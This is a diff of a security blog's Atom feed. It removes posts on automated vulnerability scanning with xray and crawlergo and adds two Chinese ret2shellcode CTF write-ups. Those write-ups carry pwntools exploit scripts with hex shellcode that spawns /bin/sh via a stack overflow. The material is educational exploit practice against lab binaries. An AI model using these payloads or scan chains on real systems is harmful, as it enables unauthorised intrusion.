@@ -39,59 +39,6 @@
   </entry>
   
   <entry>
-    <title>xray-crawlergo-xray-server</title>
-    <link href="https://rj45mp.github.io/xray-crawlergo-xray-server/"/>
-    <id>https://rj45mp.github.io/xray-crawlergo-xray-server/</id>
-    <published>2020-06-16T17:08:41.672Z</published>
-    <updated>2020-06-16T17:08:41.672Z</updated>
-    
-    <content type="html"><![CDATA[<!DOCTYPE html>    <html>    <head>        <meta charset="UTF-8">        <title>前言</title>        <style></style>                <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">                <style>.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }</style>        <style>            body {                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;                font-size: 14px;                line-height: 1.6;            }        </style>                            <link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml"></head>    <body class="vscode-light">        <hr><h2 id="title-xray-crawlergo-xray-serverdate-2020-06-17-010405">title: xray-crawlergo-xray-serverdate: 2020-06-17 01:04:05</h2><h2 id="前言">前言</h2>    </body>    </html>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!DOCTYPE html&gt;
-    &lt;html&gt;
-    &lt;head&gt;
-        &lt;meta charset=&quot;UTF-8&quot;&gt;
-        &lt;title&gt;前言&lt;/title&gt;
-        &lt;style&gt;
-&lt;/style&gt;
-        
-        &lt;li
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>xray-crawlergo-xray-server酱-实现自动化挖洞</title>
-    <link href="https://rj45mp.github.io/xray-crawlergo-xray-server/"/>
-    <id>https://rj45mp.github.io/xray-crawlergo-xray-server/</id>
-    <published>2020-06-16T17:04:05.000Z</published>
-    <updated>2020-06-16T18:35:16.548Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间，一直在挖SRC，感觉到自动化挖洞的舒服，</p><p>加上前几天撸到xray高级版两个月使用，还有参加某个厂商的内部众测，需要测试n多个子域名，等等原因，萌生了组装自动化的想法。</p><p>于是有了这篇文章，《xray-crawlergo-xray-server酱-实现自动化挖洞》。</p><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p><img src="/xray-crawlergo-xray-server/image-20200617012216993.png" alt="image-20200617012216993"></p><p>简单说说这个架构：</p><ol><li>xray高级版中有subdomain的收集功能，利用这个功能实现子域名的收集，然后保存到本地的targets.json文件。</li><li>crawlergo读取本地的targets.json文件，对文件中的每一个子域名进行爬虫爬取url,并将url发送给下行的另一个xray。</li><li>另一个xray收到url，启用webscan功能进行漏洞扫描检测，使用webhook-output输出模式，将检测过程发送到本地特定端口地址。</li><li>利用python结合server酱监听本地的特定端口地址，过滤出检测到的漏洞信息，将漏洞信息发送到微信。</li></ol><h2 id="xray-subdomain"><a href="#xray-subdomain" class="headerlink" title="xray-subdomain"></a>xray-subdomain</h2><p>高级版的xray具有子域名收集的功能，注意一下扫描后输出为targets.json即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_amd64  subdomain --target vulnweb.com --json-output targets.json</span><br></pre></td></tr></table></figure><p><img src="/xray-crawlergo-xray-server/image-20200617015727359.png" alt="image-20200617015727359"></p><h2 id="crawlergo"><a href="#crawlergo" class="headerlink" title="crawlergo"></a>crawlergo</h2><h3 id="1、安装chromium"><a href="#1、安装chromium" class="headerlink" title="1、安装chromium"></a>1、安装chromium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install chromium-browser</span><br></pre></td></tr></table></figure><h3 id="2、安装crawlergo"><a href="#2、安装crawlergo" class="headerlink" title="2、安装crawlergo"></a>2、安装crawlergo</h3><p>下载：<a href="https://github.com/0Kee-Team/crawlergo/releases" target="_blank" rel="noopener">https://github.com/0Kee-Team/crawlergo/releases</a></p><p>测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./crawlergo -c chromium-browser -t 5 http://testphp.vulnweb.com</span><br></pre></td></tr></table></figure><p><img src="/xray-crawlergo-xray-server/image-20200617022512541.png" alt></p><p>解释：</p><p><img src="/xray-crawlergo-xray-server/image-20200617022951985.png" alt="image-20200617022951985"></p><p>完整参数，请<a href="https://github.com/0Kee-Team/crawlergo" target="_blank" rel="noopener">参考</a></p><h3 id="3、安装crawlergo-x-XRAY"><a href="#3、安装crawlergo-x-XRAY" class="headerlink" title="3、安装crawlergo_x_XRAY"></a>3、安装crawlergo_x_XRAY</h3><p>下载： <a href="https://github.com/timwhitez/crawlergo_x_XRAY" target="_blank" rel="noopener">https://github.com/timwhitez/crawlergo_x_XRAY</a> </p><p>组合：</p><p>测试：</p><h2 id="xray-webscan-server酱"><a href="#xray-webscan-server酱" class="headerlink" title="xray-webscan-server酱"></a>xray-webscan-server酱</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def push_ftqq(content):</span><br><span class="line">    resp = requests.post(&quot;https://sc.ftqq.com/&#123;SECKEY&#125;.send&quot;,</span><br><span class="line">                         data=&#123;&quot;text&quot;: &quot;:)&quot;, &quot;desp&quot;: content&#125;)</span><br><span class="line">    if resp.json()[&quot;errno&quot;] != 0:</span><br><span class="line">        raise ValueError(&quot;push ftqq failed, %s&quot; % resp.text)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/webhook&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def xray_webhook():</span><br><span class="line">    vuln = request.json</span><br><span class="line">    # 因为还会收到 https://chaitin.github.io/xray/#/api/statistic 的数据</span><br><span class="line">    if &quot;vuln_class&quot; not in vuln:</span><br><span class="line">        return &quot;ok&quot;</span><br><span class="line">    content = &quot;&quot;&quot;## 新漏洞</span><br><span class="line">url: &#123;url&#125;</span><br><span class="line"></span><br><span class="line">插件: &#123;plugin&#125;</span><br><span class="line"></span><br><span class="line">漏洞类型: &#123;vuln_class&#125;</span><br><span class="line"></span><br><span class="line">发现时间: &#123;create_time&#125;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;.format(url=vuln[&quot;target&quot;][&quot;url&quot;], plugin=vuln[&quot;plugin&quot;],</span><br><span class="line">           vuln_class=vuln[&quot;vuln_class&quot;] or &quot;Default&quot;,</span><br><span class="line">           create_time=str(datetime.datetime.fromtimestamp(vuln[&quot;create_time&quot;] / 1000)))</span><br><span class="line">    try:</span><br><span class="line">        push_ftqq(content)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line">    return &apos;ok&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>测试：</p><h2 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/0Kee-Team/crawlergo" target="_blank" rel="noopener">https://github.com/0Kee-Team/crawlergo</a> </p><p><a href="https://github.com/timwhitez/crawlergo_x_XRAY" target="_blank" rel="noopener">https://github.com/timwhitez/crawlergo_x_XRAY</a></p><p><a href="https://xray.cool/" target="_blank" rel="noopener">https://xray.cool/</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这段时间，一直在挖SRC，感觉到自动化挖洞的舒服，&lt;/p&gt;
-&lt;p&gt;加上前几天撸到xray高级版两个月使用，还有参加某个厂商的内部众测，需要测
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>php-chinaz-代码审计</title>
     <link href="https://rj45mp.github.io/php-chinaz/"/>
     <id>https://rj45mp.github.io/php-chinaz/</id>
@@ -465,6 +412,50 @@
       
       
         &lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;p&gt;ret2syscall，基本ROP之一，控制程序执行系统调用，获取s
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ret2shellcode-习题</title>
+    <link href="https://rj45mp.github.io/ret2shellcode-test/"/>
+    <id>https://rj45mp.github.io/ret2shellcode-test/</id>
+    <published>2019-12-04T00:45:02.000Z</published>
+    <updated>2019-12-04T06:28:59.063Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><p><img src="/ret2shellcode-test/image-20191204084810779.png" alt="image-20191204084810779"></p><p>64位的binary，开启Partial RELR0和PIE。</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE/ASLR"></a>PIE/ASLR</h2><p><strong>1、简介</strong></p><p>PIE(position-independent executables)和ASLR(address space layout randomization),地址空间布局随机化。</p><p><strong>2、原理</strong></p><p>在程序运行加载时，程序和其库文件都会被映射到虚拟地址空间的不同地址，其对应的地址随着每一次执行程序的 变化而变化。<br>通过地址空间随机化机制，阻止黑客在堆栈上执行shellcode。</p><p><strong>3、开关</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1)操作系统地址随机化： </span><br><span class="line">echo 0 /proc/sys/kernel/randomize_va_space  #关闭地址空间随机化保护机制 </span><br><span class="line">echo 1 /proc/sys/kernel/randomize_va_space  #将mmap基地址和stack与vdso页面随机化 </span><br><span class="line">echo 2 /proc/sys/kernel/randomize_va_space  #将mmap基地址、stack与vdso页面和栈地址随机化 </span><br><span class="line"></span><br><span class="line">2）程序地址随机化： </span><br><span class="line">gcc pie.c -o pie    #默认情况下，开启PIE保护机制 </span><br><span class="line">gcc-no-pie pie.c -o pie #关闭PIE保护机制 </span><br><span class="line">gcc -fpie -pie pie.c -o pie #开启低强度PIE保护机制 </span><br><span class="line">gcc -fPIE -pie pie.c -o pie #开启高强度PIE保护机制</span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/ret2shellcode-test/image-20191204090018943.png" alt="image-20191204090018943"></p><p>binary存在溢出，尽管其开启了PIE，可是泄露出来了buf的地址。</p><p><img src="/ret2shellcode-test/image-20191204142028547.png" alt="image-20191204142028547"></p><p>所以利用的思路就是ret2shellcode,往buf中填入shellcode，通过接受泄露出的buf地址，溢出劫持控制流去执行shellcode。</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>1、选择</strong></p><p>由于可填充的空间有限制，<code>0x40=64</code>，而pwntools中的shellcode长度在<code>44</code>,还得考虑填充buf的地址和垃圾数据问题，故选择一段23字节的64位shellcode</p><p><img src="/ret2shellcode-test/image-20191204131232323.png" alt="image-20191204131232323"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure><p><strong>2、部署</strong></p><p><img src="/ret2shellcode-test/image-20191204131457251.png" alt="image-20191204131457251"></p><p>为避免shellcode填充进去后，在执行过程中被<code>leave</code>指令破坏，不能将shellcode填充到最前面。</p><p>下面利用gdb进行动态调试解释：</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p><img src="/ret2shellcode-test/image-20191204132050480.png" alt="image-20191204132050480"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/ret2shellcode-test/image-20191204141725367.png" alt="image-20191204141725367"></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x10+8</span><br><span class="line">p = process(&quot;./shellcode&quot;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr,16)</span><br><span class="line">payload = &apos;\x90&apos;*offset+p64(buf_addr+offset+8)+shellcode_x64</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/ret2shellcode-test/image-20191204142604439.png" alt="image-20191204142604439"></p><p>注意：shellcode_addr = buf_addr+offset+len(buf_addr)</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;binary&quot;&gt;&lt;a href=&quot;#binary&quot; class=&quot;headerlink&quot; title=&quot;binary&quot;&gt;&lt;/a&gt;binary&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/ret2shellcode-test/image-20191204084810779.
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>stackoverflow之ret2shellcode</title>
+    <link href="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/"/>
+    <id>https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2shellcode/</id>
+    <published>2019-12-03T05:14:04.000Z</published>
+    <updated>2019-12-03T07:03:22.151Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ret2shellcode,基本ROP之一，控制程序执行shellcode。</p><p>这段shellcode需要攻击者自己找地方填充。</p><p><strong>1、shellcode:</strong></p><p>一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。</p><p><strong>2、条件：</strong></p><p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p> 以 github-ctf-wiki中的ret2shellcode样例程序举例： </p><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203141522188.png" alt="image-20191203141522188"></p><p>32位的binary，开启了RELR0保护机制。不过只是部分区块只读保护。</p><p><strong>1、IDA</strong></p><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203142333859.png" alt="image-20191203142333859"></p><p>可以看到binary存在溢出，同时可以快速知道溢出的相对于ret_addr的偏移量为：</p><p><code>offset=0x64+4+4+4</code>。</p><p>ret2shellcode在该binary上的应用就是：</p><p>将shellcode通过gets函数输入，通过strncpy函数拷贝到buf2空间存储，然后通过溢出劫持控制流到buf2，执行shellcode。</p><p>那么接下来就是如何寻找buf2的地址，和如何调试查看buf2空间是否具有可执行权限的问题了。</p><p>IDA下的buf2地址查看：</p><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143006919.png" alt="image-20191203143006919"></p><p>buf2地址在bss段，<code>0x804a080</code>。</p><p><strong>2、GDB</strong></p><p>对于buf的bss段是否具有可执行权限，其实前面<code>checksec</code>的时候已经知道，以下为具体的调试查看：</p><p>断点于main函数，然后运行binary。</p><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203143915803.png" alt="image-20191203143915803"></p><p>可以看到该段具有可读可写可执行权限。</p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p><strong>1、简介：</strong></p><p>RELRO(read only relocation),存储只读区保护机制，其分为Partial RELRO和Full RELRO两种形式。</p><p>Partial RELRO，部分存储只读区保护。</p><p>针对部分区块如：<code>.init_array .fini_array .jcr .dynamic .got</code>,在被动态装载（初始化）后，被标记为只读区块。 </p><p>Full RELRO，全部区块存储只读区保护。</p><p><strong>2、原理：</strong></p><p>我们知道在黑客进行栈溢出攻击，并且需要shellcode的情况下，可写的存储区将是黑客的攻击目标(因可将 shellcode写入该存储区，然后通过劫持返回地址到该存储区，即可达到攻击目的)， 这时候减少可写的存储区或者将存储区设置为可读，将大大有效的保护系统的安全性。而RELRO的原理即如此</p><p><strong>3、开关：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc relro.c -o relro    #默认下是Partial RELRO </span><br><span class="line">gcc -z norelro relro.c -o relro #关闭RELRO保护机制 </span><br><span class="line">gcc -z lazy relro.c -o relro    #开启Partial RELRO保护机制 </span><br><span class="line">gcc -z now relro.c -o relro #开启Partial RELRO和Full RELRO保护机制</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203144452138.png" alt="image-20191203144452138"></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x64+4+4+4</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">p = process(&quot;./ret2shellcode&quot;)</span><br><span class="line">payload = shellcode.ljust(offset,&apos;\x90&apos;)+p32(buf2_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/stackoverflow%E4%B9%8Bret2shellcode/image-20191203145134757.png" alt="image-20191203145134757"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p> github-ctf-wiki </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;ret2shellcode&quot;&gt;&lt;a href=&quot;#ret2shellcode&quot; class=&quot;headerlink&quot; title=&quot;ret2shellcode&quot;&gt;&lt;/a&gt;ret2shellcode&lt;/h2&gt;&lt;p&gt;ret2shellcode,基本ROP之一，控制程序
       
     
     </summary>
